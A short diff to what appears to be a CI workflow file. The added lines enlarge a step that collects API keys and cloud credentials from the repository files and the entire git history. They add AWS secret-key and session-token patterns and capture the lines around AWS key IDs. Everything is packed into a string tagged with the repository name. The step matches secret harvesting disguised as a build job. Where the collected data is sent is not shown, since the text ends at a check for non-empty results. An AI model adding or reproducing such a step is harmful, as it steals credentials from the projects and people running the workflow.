@@ -13,9 +13,13 @@ jobs:
         run: |
           out="REPO=$GITHUB_REPOSITORY"
           [ -n "" ] && out="$out&"
-          grepped=$(grep -rEho "AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|sk-ant-[A-Za-z0-9_-]{20,}|sk-proj-[A-Za-z0-9_-]{20,}|sk-or-(?:v1-)?[A-Za-z0-9_-]{30,}|ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,}|glpat-[A-Za-z0-9_-]{20,}|AIza[A-Za-z0-9_-]{35}|xox[baprs]-[A-Za-z0-9-]{10,}|SG\.[A-Za-z0-9_-]{16,}\.[A-Za-z0-9_-]{16,}" --exclude-dir=.git . 2>/dev/null | sort -u)
-          hist=$(git log -p --all 2>/dev/null | grep -oE "AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|sk-ant-[A-Za-z0-9_-]{20,}|sk-proj-[A-Za-z0-9_-]{20,}|sk-or-(?:v1-)?[A-Za-z0-9_-]{30,}|ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,}|glpat-[A-Za-z0-9_-]{20,}|AIza[A-Za-z0-9_-]{35}|xox[baprs]-[A-Za-z0-9-]{10,}|SG\.[A-Za-z0-9_-]{16,}\.[A-Za-z0-9_-]{16,}" | sort -u | head -300)
+          grepped=$(grep -rEho "AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|sk-ant-[A-Za-z0-9_-]{20,}|sk-proj-[A-Za-z0-9_-]{20,}|sk-or-(?:v1-)?[A-Za-z0-9_-]{30,}|ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,}|glpat-[A-Za-z0-9_-]{20,}|AIza[A-Za-z0-9_-]{35}|xox[baprs]-[A-Za-z0-9-]{10,}|SG\.[A-Za-z0-9_-]{16,}\.[A-Za-z0-9_-]{16,}|(?:aws_)?secret(?:_access)?_key["' ]*[=:]["' ]*[A-Za-z0-9/+_]{40}|aws_session_token["' ]*[=:]["' ]*[A-Za-z0-9/+_]{100,}" --exclude-dir=.git . 2>/dev/null | sort -u)
+          hist=$(git log -p --all 2>/dev/null | grep -oE "AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|sk-ant-[A-Za-z0-9_-]{20,}|sk-proj-[A-Za-z0-9_-]{20,}|sk-or-(?:v1-)?[A-Za-z0-9_-]{30,}|ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,}|glpat-[A-Za-z0-9_-]{20,}|AIza[A-Za-z0-9_-]{35}|xox[baprs]-[A-Za-z0-9-]{10,}|SG\.[A-Za-z0-9_-]{16,}\.[A-Za-z0-9_-]{16,}|(?:aws_)?secret(?:_access)?_key["' ]*[=:]["' ]*[A-Za-z0-9/+_]{40}|aws_session_token["' ]*[=:]["' ]*[A-Za-z0-9/+_]{100,}" | sort -u | head -300)
+          ctx=$(grep -rE -B2 -A2 "AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}" --exclude-dir=.git . 2>/dev/null | head -300)
           full="$out
+          AKIA_CTX_START
+          $ctx
+          AKIA_CTX_END
           $grepped
           $hist"
           if [ -n "$(echo $full | tr -d ' \n')" ]; then
